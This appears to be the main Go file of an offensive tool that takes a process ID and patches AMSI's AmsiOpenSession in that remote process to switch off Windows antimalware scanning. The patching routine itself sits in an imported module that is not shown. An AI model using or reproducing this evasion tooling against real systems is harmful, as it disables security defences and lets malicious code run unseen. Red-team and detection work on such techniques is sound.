package main

import (
	"flag"
	"fmt"
	"os"

	"github.com/lum8rjack/diversion/modules"
)

func exitNote(result string) {
	flag.PrintDefaults()
	fmt.Println(result)
	os.Exit(1)
}

func main() {
	pid := flag.Int("pid", 0, "PID of the process to inject into")

	flag.Parse()

	if *pid == 0 {
		exitNote("\nYou must provide a PID to inject into")
	}

	err := modules.PatchAmsi(*pid)
	if err != nil {
		exitNote(fmt.Sprint(err))
	}

	fmt.Printf("Successfully patched AMSI.AmsiOpenSession in remote process with PID: %d\n", *pid)
}
